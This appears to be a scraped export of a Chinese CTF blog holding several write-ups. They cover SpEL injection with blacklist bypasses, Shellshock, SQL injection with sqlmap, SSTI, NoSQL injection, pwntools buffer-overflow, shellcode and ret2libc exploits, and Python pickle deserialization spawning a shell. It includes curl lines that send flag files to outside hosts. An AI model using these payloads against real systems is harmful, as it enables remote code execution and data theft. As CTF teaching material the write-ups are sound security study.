parser.parseExpression("T(Integer).MAX_VALUE").getValue(int.class);System.out.println(result3);//类静态方法调用int result4 = parser.parseExpression("T(Integer).parseInt('1')").getValue(int.class);System.out.println(result4); 类实例化类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 instanceof 表达式SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。 变量定义以及引用变量定义通过 EvaluationContext 接口的 setVariable(variableName, value) 方法定义；在表达式中使用”#variableName”引用；除了引用自定义变量，SpE 还允许引用根对象及当前上下文对象，使用”#root”引用根对象，使用”#this”引用当前上下文对象； 自定义函数目前只支持类静态方法注册为自定义函数；SpEL 使用 StandardEvaluationContext 的registerFunction 方法进行注册自定义函数，其实完全可以使用 setVariable 代替，两者其实本质是一样的。 检测方法全局搜索org.springframework.expression.spel.standard或expression.getValue()、expression.setValue()，再分析代码中传入的参数是否可控。 javacon题目分析本题来自P牛code-breaking中的一道Java题，名为javacon，题目知识点为SpEL注入，这里记下相关笔记。 题目下载地址：https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar 本地运行：java -jar challenge-0.0.1-SNAPSHOT.jar 访问页面，是个登录界面，请求参数带有jsessionid，其是在cookie的属性 ： 随意输入，会提示“登陆失败，用户名或者密码错误！”。 Java题目，一般都是从代码审计入手，用IDEA打开该jar包，主要看/BOOT-INF/classes目录下的文件即可，发现存在一个application.yml文件： 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 该文件分了3个模块，spring模块定义了HTML模板、UTF-8编码以及无缓存；keywords定义了黑名单，过滤了“java.lang”、“Runtime”、“exec.(”等；user模块定义了用户名和密码，还有一个记住我的值。 Spring框架的关键在于Controller，看到MainController.class，其中定义了ExpressionParser属性，该属性在getAdvanceValue()函数中会调用来解析字符串内容，由此可知getAdvanceValue()函数是SpEL注入的触发点： 1234567891011121314151617181920212223@Controllerpublic class MainController &#123; ExpressionParser parser = new SpelExpressionParser(); ... private String getAdvanceValue(String val) &#123; String[] var2 = this.keyworkProperties.getBlacklist(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String keyword = var2[var4]; Matcher matcher = Pattern.compile(keyword, 34).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125;&#125; 再看看哪里调用的getAdvanceValue()函数，发现是在admin()函数中调用了，传递的参数是username的值： 1234567891011121314151617181920212223242526272829303132333435@GetMappingpublic String admin(@CookieValue(value = "remember-me",required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals("")) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute("username", username); &#125; &#125; Object username = session.getAttribute("username"); if (username != null &amp;&amp; !username.toString().equals("")) &#123; model.addAttribute("name", this.getAdvanceValue(username.toString())); return "hello"; &#125; else &#123; return "redirect:/login"; &#125;&#125;... @PostMapping(&#123;"/login"&#125;)public String login(@RequestParam(value = "username",required = true) String username, @RequestParam(value = "password",required = true) String password, @RequestParam(value = "remember-me",required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute("username", username); if (isRemember != null &amp;&amp; !isRemember.equals("")) &#123; Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return "redirect:/"; &#125; else &#123; return "redirect:/login-error"; &#125;&#125; 这里研究一下怎么控制这个username的值，先看注解为”/login”的login()函数，其传入3个参数，第三个remember-me为非必须的，在第一个if语句即判断username和password是否是正确的，是则通过调用session.setAttribute(&quot;username&quot;)来设置session中的username值，再判断remember-me的值进行设置，然后重定向到主页面，否则登录失败直接返回错误信息。也就是说，这里是没办法进行SpEL注入的，因为username和password都写不正确如何进入后面的逻辑呢？ 再来看看主页面的代码逻辑即注解为“@GetMapping”的admin()函数。先判断remember-me是否为空，为空时直接调用session.getAttribute(&quot;username&quot;);获取session中即login()函数中设置的username再调用getAdvanceValue()函数，此时因为username是正确的用户名因此无法SpEL注入；若rememberMeValue不为空即login时选择了remember-me，则解码rememberMeValue值为username并通过调用session.setAttribute(&quot;username&quot;)来设置session中的username值，此时的username就可控了。 那么注入点的场景已经可以确定了：输入admin/admin并勾选remember-me选项登录后台，然后再修改cookie内容即可。 先登录到admin界面，看到会设置Cookie字段值为remember-me=MXPUSANQRVaBJYtUucUgmQ==： 直接调用或复制加密代码，在它的代码中找到几个参数然后传进加密处理，执行完毕结果和Cookie字段值的base64结果一致： 行吧，那就将变量value从admin改为Mi1k7ea试试，得到加密值为4Hd10g7CuZZg5M1up1GExg==，放到cookie中发送报文，可以看到admin修改为Mi1k7ea，说明这里即为SpEL注入点： 构造payload开始网上搜的一大堆SpEL注入exp无法利用，因为这里使用了黑名单过滤了java.lang、Runtime和exec(。 尝试了使用ProcessBuilder().start()来绕过，但是没利用成功。 后面参考了一篇wp，发现可以用Java的反射机制来绕过，具体绕过原理是因为通过反射机制的forName()和getMethod()等方法，其参数是字符串因此可通过字符串拼接的方式来绕过黑名单。 Windows场景本地弹计算器常见的payload： 1String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("exec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;); 但是这里需要改为SpEl的解析格式以满足Spring的解析条件，主要就是改一个T() 。在SpEL中，使用T()运算符会调用类作用域的方法和常量。 注意，以new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;xx&quot;}这种形式定义命令是为了满足Linux下复杂命令构造的条件，通用。当然Linux下应该写为new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;xxxxx&quot;}。 payload如下： 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;)&#125; 加密后发送过去，SpEL注入成功： 回带flag这里换下payload，读取本地flag文件，由于没有回显，需要外带出来，使用curl命令结合反引号执行系统命令并带回： 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","curl xx.ceye.io/`dir`"&#125;)&#125; 但是在Windows上这段代码不能将命令执行带回来，因为Windows中cmd不会解析反引号，只会将命令原封不动地返回过来： 既然这样，就使用curl的-T参数往外上传文件，然后通过ftp接收即可： 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","curl -T flag.txt ftp://192.168.248.1/"&#125;)&#125; 发送编码后的payload，在目标FTP端看到接收的文件，收到上传flag.txt： Linux场景一般题目环境为Linux，这里直接换如下命令即可，其中curl命令可直接结合反引号使用，中间加上base64命令将所有结果编码以便于可以带回所有内容而非只有第一行结果，最后tr命令将结果中的换行符换为-以便于后面解码的使用： 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","curl xx.ceye.io/`cat flag.txt|base64|tr '\n' '-'`"&#125;)&#125; JavaScript引擎Bypass在Java 1.8之后，Nashorn取代了Rhino（Java 1.6/1.7）成为Java的嵌入式JavaScript引擎。 也就是说，可以通过Java调用该JS引擎，然后通过JS引擎调用eval()来执行Java代码。 基本payload基本Payload示例如下： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)&#125; 要想在本题执行命令，需要结合前面构造的反射机制来实现： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"cmd","/C","calc"&#125;)),)&#125; URL编码前面的payload有点麻烦，感觉多此一举，这里我们可以升级一下payload，进行URL编码，可以绕过一些过滤机制，并无需结合反射机制： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)&#125; 其中URL编码内容为：java.lang.Runtime.getRuntime().exec(&quot;calc&quot;).getInputStream()，不加最后的getInputStream()也行，只是为了后面回显铺垫。 在这道题可以成功Bypass黑名单实现SpEL注入： 添加回显增加回显的payload如下，其中URL编码内容为java.lang.Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream()： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())&#125; 访问直接得到命令执行结果： 参考Code-Breaking Puzzles — javacon WriteUp Java代码审计之SpEL表达式注入]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AeroCTF writeupup之board tracking system]]></title>
    <url>%2F2019%2F03%2F13%2FAeroCTF-writeupup%E4%B9%8Bboard-tracking-system%2F</url>
    <content type="text"><![CDATA[题目如下，大概意思是开发了一个追踪系统，问是否是有安全漏洞的： 打开页面，看到加载了一段Stats内容： 查看源码发现该段内容是请求了一个URL加载过来的，访问该地址，是包含cgi-bin路径的： 由cgi-bin我们可以联想到大名鼎鼎的Bash远程命令执行漏洞。记得之前看过的一篇文章：https://www.freebuf.com/vuls/44994.html 那就测试一下，在UserAgent注入payloadUser-Agent: () { :;};echo -e &quot;\r\n$(/usr/bin/whoami)&quot;发现成功执行whoami命令： 接着就使用ls寻找flag相关文件有没有，在当前目录找到stats文件： cat看下stats文件有啥： 没啥东西，继续用ls看其他目录，没啥进展。 最后在查看/etc/passwd时找到了这个隐藏的flag：]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TAMUctf Web writeup]]></title>
    <url>%2F2019%2F03%2F09%2FTAMUctf-Web-writeup%2F</url>
    <content type="text"><![CDATA[很简单，但是还是把笔记放上来吧。 Not Another SQLi Challenge题目：http://web1.tamuctf.com/ 打开是个登录界面，直接SQL注入getflag： Robots Rule题目：http://web5.tamuctf.com/ 打开页面，提示ROBOTS： 直接访问robots.txt，内容如下： 大致意思就是告诉它有一个Google robots，直接更换UserAgent为googlebot即谷歌爬虫，从而getflag： Many Gig’ems to you!题目：http://web7.tamuctf.com/ 打开页面，发现有两个按钮，且页面存在大量图片： 右键查看源码，发现图片中的alt属性值有蹊跷： 找到了一个gigem{flag_in_字符串，退出剩下的应该在其他页面中找到。 点击Gigs!按钮时当前主页面，点击Cookies!跳转到cookies.html页面，该页面也存在大量图片，同理查看源码： 发现如下可以字符串：gigem{_continued=source_and_。 最后，根据cookies提示，查看报文的cookie值，其中有个cookies.js设置cookie值，看到其中关联的字符串gigem_continue=cookies}： 一切清晰了，拼起来就是gigem{flag_in_source_and_cookies}，这就是flag。 Science!题目：http://web3.tamuctf.com/ 访问题目，提示是Python Flask搭建的Web服务，其中可以输入内容查询，推测是SSTI即服务端模板注入攻击： 验证一下，在其中一个输入框输入579，结果返回了该表达式执行的结果，证明了存在SSTI漏洞： 接着上任意文件读取payload即可： Buckets题目：http://tamuctf.s3-website-us-west-2.amazonaws.com/ 访问网页，说狗肯定比猫好，背景是狗的图片，除此之外没啥了： 查看页面源码，有两段提示，大概说的是这是作者第一个AWS Web页面，用的是S3 buckets框架，且passowrd在Dogs附近： 这里涉及到AWS S3 buckets框架的一个知识点，就是访问http://tamuctf.s3-website-us-west-2.amazonaws.com/，也可以通过访问http://tamuctf.s3.amazonaws.com/实现，是一样的。 访问Key标签的URL即可getflag： Login App题目：http://web4.tamuctf.com/ 访问页面，是个提供输入用户名和密码的登录界面，但是怎么输入都没有反应，查看页面源码，关键部分如下： 123456789101112131415161718192021222324252627282930313233343536373839404142....form .register-form &#123; display: none;&#125;...&lt;div class="login-page"&gt; &lt;div class="form"&gt; &lt;form class="register-form"&gt; &lt;input type="text" placeholder="name"/&gt; &lt;input type="password" placeholder="password"/&gt; &lt;input type="text" placeholder="email address"/&gt; &lt;button&gt;create&lt;/button&gt; &lt;/form&gt; &lt;form class="login-form"&gt; &lt;input id="username" type="text" placeholder="username"/&gt; &lt;input id="password" type="password" placeholder="password"/&gt; &lt;button id="submit"&gt;login&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt; $("#submit").on('click', function()&#123; $.ajax(&#123; url: 'login', type : "POST", dataType : 'json', data : JSON.stringify(&#123;"username": $("#username").val(), "password": $("#password").val()&#125;), contentType: 'application/json;charset=UTF-8', success : function(result) &#123; $(".result").html(result); console.log(result); alert(result); &#125;, error: function(xhr, resp, text) &#123; $(".result").html("Something went wrong"); console.log(xhr, resp, text); &#125; &#125;) &#125;);&lt;/script&gt;... 虽然在页面中隐藏了注册表单，但是没啥用，因为后面的JS代码只会在id为submit的元素被点击时触发，而只有登录的表单含有该id元素；注意到JS代码的作用，它以POST方法请求的是/login，以Json格式上传username和password参数，Content-Type设置为application/json，构造报文尝试一下： 成功返回数据。这里看到登录的参数是通过Json格式提交的，可以推测是一道NoSQL注入题目。 这里尝试使用$ne即not equal不相等，用来查询某个记录不等于该值的所有记录。 我们知道密码不为空，参考网上的NoSQL注入payload，那我们就直接输入payload如下就getflag了： Bird Box Challenge题目：http://web2.tamuctf.com/ 提示了：We’ve got Aggies, Trucks, and Eggs! 访问网页，是一个提供输入的查询页面： 随便输入，会找不到东西，但是输入提示的内容就会显示相应的东西： 关注到页面并没有其他的功能点了，抓包也确认了确实只有Search.php的Search参数存在注入点，且页面没有直接返回错误信息，猜测应该就是SQL盲注吧，且在抓包过程发现，输入eggs即正常数据以及输入查询不到的数据，服务端都是返回500，但其他出错查询时就返回400： 下面就上sqlmap跑起来，但是一开始没有跑出啥东西，经过测试发现是校验了UserAgent，后台对UserAgent为sqlmap的报文进行了过滤，而sqlmap默认的UA即包含sqlmap字样： sqlmap中先加入–random-agent，跑出为mysql，然后–dbs参数跑出两个数据库，当然可以添加–technique=BT指定基于布尔和时间的盲注来提高效率： 12345root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --dbs...available databases [2]:[*] information_schema[*] SqliDB 然后-D参数指定SqliDB数据库，–tables参数跑出表Search： 1234567root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB --tables...Database: SqliDB[1 table]+--------+| Search |+--------+ -T参数指定Search表，–columns参数跑出表项items： 12345678910root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --columns...Database: SqliDBTable: Search[1 column]+--------+--------------+| Column | Type |+--------+--------------+| items | varchar(100) |+--------+--------------+ –dump参数将表项的内容全列出来： 123456789101112root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --dump...Database: SqliDBTable: Search[3 entries]+--------+| items |+--------+| Aggies || Eggs || Trucks |+--------+ 发现是提示的几个内容，也就是说数据库只保存了这几个东西，flag并不在此。 –users参数查询一下所有用户，发现有且仅有一个的用户名就是flag： 1234root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --users...database management system users [1]:[*] &apos;gigem&#123;w3_4r3_th3_4ggi3s&#125;&apos;@&apos;localhost&apos; 1337 Secur1ty题目：http://web6.tamuctf.com/ 访问页面，有个登录窗口和注册窗口： 在注册的响应报文中，发现设置cookie的信息： 注册完成后，有3个页面如下： Profile中显示个人注册信息，并且可以修改： Messages中显示收到的消息，并且可以写新消息发送给别人： Employees中可以看到所有注册的人的消息： 从这里可以分析得出，Alan是我注册的用户，这里ID为5，和cookie中userid为5是对应的，也就是说，1337-admin的userid为1，还需要知道它的cookie中secret的属性值才能登上admin的用户来访问。 现在问题转变为，如何获取secret呢？界面功能有限，一个个点，抓包观察，发现Messages的消息列表可以点进去，且似乎有个id参数注入点： 直接丢到sqlmap，发现id参数确实可注入。接着添加sqlmap其他参数让它自己表演就可以了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql --dbs...available databases [2]: [*] 1337_Secur1ty[*] information_schemaroot@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty --tables...Database: 1337_Secur1ty[2 tables]+----------+| Messages || Users |+----------+root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --columns...Database: 1337_Secur1tyTable: Users[10 columns]+-------------+--------------+| Column | Type |+-------------+--------------+| CreateDate | datetime || Description | varchar(200) || Email | varchar(37) || FirstName | varchar(10) || LastName | varchar(15) || Password | varchar(50) || Phone | varchar(10) || Secret | varchar(50) || UserID | int(9) || Username | varchar(20) |+-------------+--------------+root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --dump...Database: 1337_Secur1tyTable: Users[2 entries]+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+| UserID | Phone | Email | Secret | Username | LastName | Password | FirstName | CreateDate | Description |+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+| 1 | &lt;blank&gt; | 1337-admin@l337secur1ty.hak | WIFHXDZ3BOHJMJSC | 1337-admin | Joeson | 02ca0b0603222a090fe2fbf3ba97d90c | Joe | 2019-03-10 07:27:46 | Most secure admin to ever grace existence. || 2 | &lt;blank&gt; | ScrubLord@l337secur1ty.hak | 4VCLO52ALSUUO5OM | ScrubLord | Bobson | fc8b8be2abe4a79bf6f36eee484c1f08 | Bob | 2019-03-10 07:27:46 | That random intern. |+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+ 可以看到，通过sqlmap将Users表中的信息dump下来，其中含有1337-admin用户的secret消息即WIFHXDZ3BOHJMJSC。 现在退出当前用户，带上这段header字段Cookie: userid=1; secret=WIFHXDZ3BOHJMJSC访问即可getflag：]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TAMUctf Pwn writeup]]></title>
    <url>%2F2019%2F03%2F08%2FTAMUctf-Pwn-writeup%2F</url>
    <content type="text"><![CDATA[虽然是灰常easy的题，但对我这种刚刚准备入门Pwn的菜鸡来说，再合适不过了。 Pwn1题目如下：pwn1 运行程序，功能是询问你名字并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开： 打开IDA分析一下，gets()函数明显地存在栈溢出漏洞，且当v5变量等于一个值时便调用print_flag()函数输出flag： 右键v5所在的if条件对应的值&gt;Hexadecimal，即可查看到该值的16进制表示为0xDEA110C8，也就是说，当v5的值为该值时，才会进行该逻辑输出flag。 结合前面的gets()栈溢出，这就很简单了，只需要栈溢出覆盖v5的值为0xDEA110C8，不需要自己去找system(‘/bin/sh’)来getshell了。 注意的是在溢出之前需要通过两次fgets()输入内容，且内容必须和前两个红框中的字符串一样。也就是说，需要先成功交互前面两个步骤，才会进入最后问你“What… is my secret?”逻辑： 计算一下偏移变量s到变量v5的偏移距离，由IDA得s=ebp-3Bh、v5=ebp-10h，则得出下图的结果： 一目了然，gets()从s处输入，当输入溢出到v5时即可覆盖该地址。此时偏移量为|(ebp-3Bh)-(ebp-10h)|=2B(h)=43(d)。 编写脚本： 12345678910111213from pwn import *sh = remote("pwn.tamuctf.com", 4321)sh.sendline("Sir Lancelot of Camelot")sh.recvuntil("What... is your quest?")sh.sendline("To seek the Holy Grail.")sh.recvuntil("What... is my secret?")payload = flat(["A" * 43, p32(0xDEA110C8)])sh.sendline(payload)print sh.recvall() 直接getflag： Pwn2题目如下：pwn2 运行程序，功能是询问你想调用哪个函数并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开： 使用IDA打开查看，gets()函数说明存在明显的栈溢出，下面还存在一个select_func()函数，点进去看到v3变量初始值为two，然后将输入的参数复制31个字节到dest变量中，然后if语句判断当dest变量值为one时将one赋值给v3，最后调用v3()函数： 也就是说，存在one()函数和two()函数，在Functions窗口中可看到它们以及print_flag()函数。点进去看one()函数和two()函数并没有发现代码有什么东西。 这里注意到，select_func()函数的参数是从前面gets()函数获取的，也就是说，我们通过gets()输入的内容可以赋值给dest变量31个字节的内容。这里观察下这几个函数的地址： one()函数地址为0x00000754，two()函数地址为0x000006AD，print_flag()函数地址为0x000006D8。 观察到，two()函数与print_flag()函数地址相差一个字节，即AD与D8。 回到前面select_func()函数中可看到，dest变量相对EBP偏移为ebp-2A，v3变量相对EBP偏移为ebp-C，则可知dest与v3之间相对偏移为|(ebp-2A)-(ebp-C)|=1E(h)=30(d)。可以得出如下的栈结构： 很清晰了，结合前面可以通过gets()给dest变量赋值31个字节，减去dest与v3之间偏移的20个字节，剩下1个字节可以溢出。而前面分析知道v3变量初始值为two，且two()函数地址和print_flag()函数地址只相差一个字节，那么就可以溢出这一个字节，将v3的初始值0x000006AD溢出为0x000006D8即可。 注意，两位1十六进制数等同于八位的二进制数，即2^4*2^4=2^8。一个字节=1bytes=8bits=八位二进制数=两位十六进制数。 编写payload： 1234567from pwn import *sh = remote("pwn.tamuctf.com", 4322)payload = flat(["A" * 30, "\xD8"])sh.sendline(payload)print sh.recvall() getflag： Pwn3题目如下：pwn3 运行程序，功能是给你一个地址并让你输入内容；该ELF文件是动态链接的；checksec查看发现Canary、NX没有打开，且有RWX即可读写执行的代码段，这里推测应该是一道写shellcode执行的题： 使用IDA打开查看，main()函数调用了echo()函数，在echo()函数中输出了变量s的地址，然后调用gets()函数获取输入内容到s中，明显存在栈溢出漏洞： 虽然程序开启了RELRO，但在开始就输出了s变量的地址，这样就可以通过gets()在s处写入shellcode内容，然后接着溢出够12Ah+4即298+4个字节后将获取到的s地址覆盖掉函数返回地址、使程序跳转至s处执行shellcode： 主要分两步，第1步往s写入shellcode并溢出至函数返回地址处；第2步是用s地址覆盖函数返回地址从而跳转至s处执行shellcode。 编写payload： 123456789101112from pwn import *sh = remote("pwn.tamuctf.com",4323)sh.recvuntil("Take this, you might need it on your journey 0x")addr = int(sh.recv(8), 16)print addrshellcode = asm(shellcraft.sh())payload = flat([shellcode.ljust(0x12A + 4, "A"), p32(addr)])sh.sendline(payload)sh.interactive() getshell： Pwn4题目如下：pwn4 运行程序，功能是询问你想调用ls命令查看哪个文件并让你输入内容，这里输入-l flag.txt看到输入flag.txt的内容；该ELF文件是动态链接的；checksec查看发现只开启了NX： 使用IDA打开分析，发现循环调用laas()函数： 进入laas()函数，gets()函数获取输出，存在栈溢出漏洞，然后比较s变量值是否为ASCII码为47即斜杠/，用来过滤跨目录的注入，若没有则传入s参数调用run_cmd()函数： 在run_cmd()函数未进行任何过滤直接调用system()函数执行系统命令： 是的，作为一个Web狗，第一直觉就是命令注入，然后getflag了： 但是吧，还是要按部就班地用Pwn的方法做。可以确定了，是利用ret2libc来实现getshell，因为这里已经有了system()函数，剩下的就是找/bin/sh字符串了。 打开String窗口，看到真的有/bin/sh字符串，地址为0x0804A034： 再看下call system()的地址，为0x080485AD： 和ret2libc1原理一致，如下图： 编写payload： 其实这里system_addr地址并非system()函数地址而是call system的地址，所以此处无需再添加返回地址。 1234567891011from pwn import *sh = remote("pwn.tamuctf.com", 4324)sh.recvuntil("Enter the arguments you would like to pass to ls:")system_addr = 0x080485ADbinsh_addr = 0x0804A034payload = flat(["A" * 0x21, "BBBB", system_addr, binsh_addr])sh.sendline(payload)sh.interactive() getshell： Pwn5题目如下：pwn5 程序功能点和Pwn4一样；file命令查看该ELF文件是静态的，即和libc无关；checksec查看发现只开启了NX： 使用IDA打开分析，和Pwn4几乎一致，但是在run_cmd()函数赋值给v2变量的长度缩小为7个字节： 这里限制了输入命令的长度为7个字节，是否还能存在命令注入呢？像Pwn4那样肯定是行不通的，但是我们可以输入sh来打开shell： 当然，还有一种利用vi命令及:shell的骚姿势，输入;vi再输入:shell即可执行shell： 回到正轨，利用原理和Pwn4一样，laas()函数中的gets()存在栈溢出漏洞，打开String窗口寻找到“/bin/sh”，地址为0x080BC140： 而在Functions窗口中搜索system()函数得到其地址为0x0804EE30： 在Functions窗口中搜索exit()函数查看其地址为0x0804E330： 编写payload： 123456789101112from pwn import *sh = remote("pwn.tamuctf.com", 4325)sh.recvuntil("Enter the arguments you would like to pass to ls:")system_addr = 0x0804EE30exit_addr = 0x0804E330binsh_addr = 0x080BC140payload = flat(["A" * (0xD + 4), system_addr, exit_addr, binsh_addr])sh.sendline(payload)sh.interactive() getshell： VeggieTales题目如下，并没有给ELF文件，大概意思是我最爱看的节目同时也训练我的Python技能，我看了第5集至少13遍了： 蒙了，没有ELF，nc过去看看： 可以添加、打印、备份及加载你的观看列表。难道是黑盒堆溢出利用？？？肯定不是。 再看下提示，说一直看第5集，我们测它的功能的时候，在输入1时会让选择要第几个节目，观察到第5个节目内容如下： “Dave and the Giant Pickle”，注意到Pickle，再联系hint中的Python，可以推测应该是Python的Pickle反序列化漏洞。 关于Python的Pickle反序列化漏洞可参考Python cPickle反序列化漏洞。 逐个输入查看，添加第5集，然后输入2看到已添加进去，再输入3备份watch list、生成一个base64的东西，用于后面输入4时加载备份，当选项4中获取的输入内容不是该base64内容时会报错： 将该base64解码，得不到啥东西。 再回到hint，至少13次，由此可以推测，应该和ROT13算法有关吧。那就试下将该base64内容先进行ROT13解码再进行base64解码吧： 可以看到确实是包含该第5集的内容的，但是其中有一些非可见字符。 结合前面推测的Pickle反序列化漏洞，我们可以尝试在输入4选项即要求输入备份编码内容时，输入一段经过base64和ROT13加密的Pickle对象，其中包含字符串“Mi1k7ea”： 12345import codecsimport base64import cPickleprint codecs.encode(str(base64.b64encode(cPickle.dumps(['Mi1k7ea']))), "rot-13") cPickle.dumps()序列化一个列表为字符串，为啥不直接填字符串而加上[]呢？这是为了后面输入时输出在同一行好查看。content即为序列化后的字符串内容，再加密后输入到4选项中，再到2选项中查看，发现成功反序列化处该cPickle序列化对象，即证明了是cPickle反序列化漏洞了： OK，现在就输入一段经过base64和ROT13加密的序列化对象，利用反序列化来触发该漏洞，编写代码如下： 123456789101112import codecsimport base64import cPickleimport osimport subprocessclass Mi1k7ea(object): def __reduce__(self): # return (os.system, ('/bin/sh',)) return (subprocess.Popen, (('/bin/sh',),))print codecs.encode(base64.b64encode(cPickle.dumps(Mi1k7ea())), "rot-13") 这里有个坑，一直尝试用os.system()执行命令的方式老出差、没法成功反序列化，卡了很久，但改用subprocess.Popen()却可以成功： 要想使用os.system()成功执行，不能使用codecs中的rot-13，我们可以使用系统tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;命令来实现： 题目源码server.py： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152my_episodes = []all_episodes = ["1. Wheres God When Im S-Scared?","2. God Wants Me to Forgive Them!?!","3. Are You My Neighbor?","4. Rack, Shack and Benny","5. Dave and the Giant Pickle","6. The Toy That Saved Christmas","7. Larry-Boy! And the Fib from Outer Space!","8. Josh and the Big Wall!","9. Madame Blueberry","10. Larry-Boy and the Rumor Weed","11. 